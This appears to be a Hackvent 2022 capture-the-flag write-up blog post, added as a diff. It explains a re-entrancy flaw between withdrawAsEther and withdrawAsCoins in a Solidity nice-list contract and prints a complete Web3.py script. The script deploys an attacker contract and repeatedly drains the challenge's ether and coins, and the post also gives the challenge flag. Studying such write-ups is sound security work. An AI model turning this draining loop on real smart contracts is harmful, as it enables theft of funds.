@@ -1,0 +1,281 @@
+---
+layout: single
+title: "[HV22.19] Re-Entry to Nice List 2"
+date: 2022-12-19 20:08:34 +0100
+tags: HV22 CTF exploitation hard web3
+categories: HV22 hard
+sidebar:
+  nav: "hv22"
+---
+
+# Challenge Description
+
+The elves are going web3! Again...
+
+After last years failure where everybody could enter the nice list even seconds before christmas, Santa tasked his elves months before this years event to have finally a buy-in nice list that is also secure. To get the most value out of this endavour, they also created a new crypto currency with their own chain :O The chain is called SantasShackles and the coin is called SANTA.
+
+Try to enter the nice list and get the flag!
+
+# Overview
+
+We got a webpage and a docker instance providing us with a blockchain. Again. Two contracts have been deployed and their code as well as their addresses are given to us: [SantaCoin.sol](/assets/hv22/hv22_19_SantaCoin.sol) and [NiceListV2.sol](/assets/hv22/hv22_19_NiceListV2.sol).
+
+![website](/assets/hv22/hv22_19_website.png)
+
+From earlier challenges, I knew Web3.py and explored the given contracts and the blockchain itself.
+
+I noticed that the NiceListV2 was vulnerable for a re-entry attack in withdrawAsEther and withdrawAsCoins. The first one calls payable(msg.sender) but guards against re-entrancy, but the latter one does not use that guard and is therefore callable.
+
+The idea is to create a new contract which deposits some Santa coins, calls withdrawAsEther, gets called by it and calls withdrawAsCoins before the amount gets reduced.
+
+This has to be looped, since I extract only ~80% of the Santa I deposit, resulting in 60% win each round. When I get the ether and the coins, I transfer it back out of the contract, sell all the santa coins and start over again.
+
+After getting the flag `HV22{__N1c3__You__ARe__Ind33d__}` I automated the rest of the challenge (getting the information from the website, optimizing my attack to use 80% of the available instead of 1 eth / Santa). This is the final script:
+
+```python
+#!/usr/bin/env python3.10
+from web3 import Web3
+from solcx import compile_standard
+import requests
+import re
+import time
+
+fqdn = "0c5586c2-c5c7-49ce-91ec-4723634c0a1d.rdocker.vuln.land"
+
+start = time.time()
+
+url = f"http://{fqdn}:8080"
+page = requests.get(url).text
+addresses = re.findall(r'0x[0-9A-Za-z]+', page)
+w3 = Web3(Web3.HTTPProvider(f"http://{fqdn}:8545"))
+santaCoinAddress = addresses[0]
+niceListV2Address = addresses[1]
+privateKey = addresses[2]
+
+
+def findSantaCoinContract():
+    # compile existing contracts to get abi to be able to interact with the contract
+    with open('./SantaCoin.sol', 'r') as file:
+        santaCoinSource = file.read()
+        santaCoinCompiled = compile_standard({
+            "language": "Solidity",
+            "sources": {
+                "SantaCoin.sol": {
+                    "content": santaCoinSource
+                }},
+            "settings": {
+                "outputSelection": {
+                    "*": {
+                        "*":
+                        ["abi", "evm.bytecode"]}
+                }
+            }
+        }, solc_version="0.8.9")
+    santaCoinAbi = santaCoinCompiled["contracts"]["SantaCoin.sol"]["SantaCoin"]["abi"]
+    return w3.eth.contract(address=santaCoinAddress, abi=santaCoinAbi)
+
+
+def findNiceListV2Contract():
+    # compile existing contracts to get abi to be able to interact with the contract
+    with open('./NiceListV2.sol', 'r') as file:
+        niceListSource = file.read()
+        niceListCompiled = compile_standard({
+            "language": "Solidity",
+            "sources": {
+                "NiceListV2.sol": {
+                    "content": niceListSource
+                }},
+            "settings": {
+                "outputSelection": {
+                    "*": {
+                        "*":
+                        ["abi", "evm.bytecode"]}
+                }
+            }
+        }, solc_version="0.8.9")
+    niceListV2Abi = niceListCompiled["contracts"]["NiceListV2.sol"]["NiceListV2"]["abi"]
+    return w3.eth.contract(address=niceListV2Address, abi=niceListV2Abi)
+
+
+def uploadAttackerContract():
+    # compile contract and upload it, returning the address for later interaction
+    with open('./Attacker.sol', 'r') as file:
+        attackerSource = file.read()
+        attackerCompiled = compile_standard({
+            "language": "Solidity",
+            "sources": {
+                "Attacker.sol": {
+                    "content": attackerSource
+                }},
+            "settings": {
+                "outputSelection": {
+                    "*": {
+                        "*":
+                        ["abi", "evm.bytecode"]}
+                }
+            }
+        }, solc_version="0.8.9")
+    attackerAbi = attackerCompiled["contracts"]["Attacker.sol"]["Attacker"]["abi"]
+    attackerByteCode = attackerCompiled["contracts"]["Attacker.sol"]["Attacker"]["evm"]["bytecode"]["object"]
+    attackerContract = w3.eth.contract(
+        abi=attackerAbi, bytecode=attackerByteCode)
+    nonce = w3.eth.getTransactionCount(account)
+    tx = attackerContract.constructor(niceListV2Address).buildTransaction({
+        "gasPrice": w3.eth.gas_price,
+        "from": account,
+        "nonce": nonce
+    })
+    signed_tx = w3.eth.account.sign_transaction(tx, privateKey)
+    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
+    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
+    return w3.eth.contract(address=tx_receipt.contractAddress, abi=attackerAbi)
+
+
+def buySanta(amount):
+    nonce = w3.eth.getTransactionCount(account)
+    tx = santaCoinContract.functions.buyCoins().buildTransaction({
+        "from": account,
+        "gasPrice": w3.eth.gas_price,
+        "nonce": nonce,
+        "value": int(amount),
+        "gas": 210000
+    })
+    signed_tx = w3.eth.account.sign_transaction(tx, privateKey)
+    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
+    w3.eth.wait_for_transaction_receipt(tx_hash)
+
+
+def transferSantaToContract(amount):
+    nonce = w3.eth.getTransactionCount(account)
+    tx = santaCoinContract.functions.transfer(attackerContract.address, amount).buildTransaction({
+        "from": account,
+        "nonce": nonce,
+        "gasPrice": w3.eth.gas_price,
+        "gas": 210000
+    })
+    signed_tx = w3.eth.account.sign_transaction(tx, privateKey)
+    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
+    w3.eth.wait_for_transaction_receipt(tx_hash)
+
+
+def startAttack():
+    nonce = w3.eth.getTransactionCount(account)
+    tx = attackerContract.functions.attack().buildTransaction({
+        "from": account,
+        "nonce": nonce,
+        "gasPrice": w3.eth.gas_price,
+        "gas": 210000
+    })
+    signed_tx = w3.eth.account.sign_transaction(tx, privateKey)
+    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
+    w3.eth.wait_for_transaction_receipt(tx_hash)
+
+
+def retrieveAllSantaFromContract():
+    nonce = w3.eth.getTransactionCount(account)
+    tx = attackerContract.functions.transferSanta().buildTransaction({
+        "from": account,
+        "nonce": nonce,
+        "gasPrice": w3.eth.gas_price,
+        "gas": 210000
+    })
+    signed_tx = w3.eth.account.sign_transaction(tx, privateKey)
+    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
+    w3.eth.wait_for_transaction_receipt(tx_hash)
+
+
+def retrieveAllEthFromContract():
+    nonce = w3.eth.getTransactionCount(account)
+    tx = attackerContract.functions.transferEth().buildTransaction({
+        "from": account,
+        "nonce": nonce,
+        "gasPrice": w3.eth.gas_price,
+        "gas": 210000
+    })
+    signed_tx = w3.eth.account.sign_transaction(tx, privateKey)
+    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
+    w3.eth.wait_for_transaction_receipt(tx_hash)
+
+
+def sellAllSanta():
+    nonce = w3.eth.getTransactionCount(account)
+    tx = santaCoinContract.functions.sellCoins(getSantaBalance()).buildTransaction({
+        "from": account,
+        "gasPrice": w3.eth.gas_price,
+        "nonce": nonce,
+        "gas": 210000
+    })
+    signed_tx = w3.eth.account.sign_transaction(tx, privateKey)
+    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
+    w3.eth.wait_for_transaction_receipt(tx_hash)
+
+
+def niceListAllowance(amount):
+    nonce = w3.eth.getTransactionCount(account)
+    tx = santaCoinContract.functions.approve(niceListV2Address, amount).buildTransaction({
+        "from": account,
+        "gasPrice": w3.eth.gas_price,
+        "nonce": nonce,
+        "gas": 210000
+    })
+    signed_tx = w3.eth.account.sign_transaction(tx, privateKey)
+    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
+    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
+
+
+def buyIn(amount):
+    nonce = w3.eth.getTransactionCount(account)
+    tx = niceListV2Contract.functions.buyIn(amount).buildTransaction({
+        "from": account,
+        "gasPrice": w3.eth.gas_price,
+        "nonce": nonce,
+        "gas": 210000
+    })
+    signed_tx = w3.eth.account.sign_transaction(tx, privateKey)
+    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
+    w3.eth.wait_for_transaction_receipt(tx_hash)
+
+
+def checkIfNice():
+    if niceListV2Contract.functions.isNice(account).call():
+        print(f"success after {time.time() - start} seconds!")
+        url = f"http://{fqdn}:8080/isNice"
+        page = requests.get(url).text
+        print(page)
+    else:
+        print("no luck :(")
+
+
+def getEthBalance():
+    return w3.eth.get_balance(account)
+
+
+def getSantaBalance():
+    return santaCoinContract.functions.balanceOf(account).call()
+
+
+# get account from address, since this one is checked from website
+account = w3.eth.account.from_key(privateKey).address
+
+# find existing contracts / upload attacker contract
+santaCoinContract = findSantaCoinContract()
+niceListV2Contract = findNiceListV2Contract()
+attackerContract = uploadAttackerContract()
+
+# exploit until we have 101 eth on our account
+while getEthBalance() < int(102 * 1000000000000000000):
+    buySanta(getEthBalance() * 0.8)  # use 80% to buy santa
+    transferSantaToContract(getSantaBalance())  # transfer all to contract
+    startAttack()  # attack here!
+    retrieveAllSantaFromContract()  # send santa balance to sender
+    retrieveAllEthFromContract()  # send eth balance to sender
+    sellAllSanta()  # sell all santa
+    print(f"{getEthBalance()} eth / {getSantaBalance()} santa on web ")
+
+
+# we got enough eth, lets buy some santa
+buySanta(int(101 * 1000000000000000000))  # buy 101 Santa from web
+niceListAllowance(int(101 * 1000000000000000000))  # allowance
+buyIn(int(101 * 1000000000000000000))  # buy in
+checkIfNice()
+```
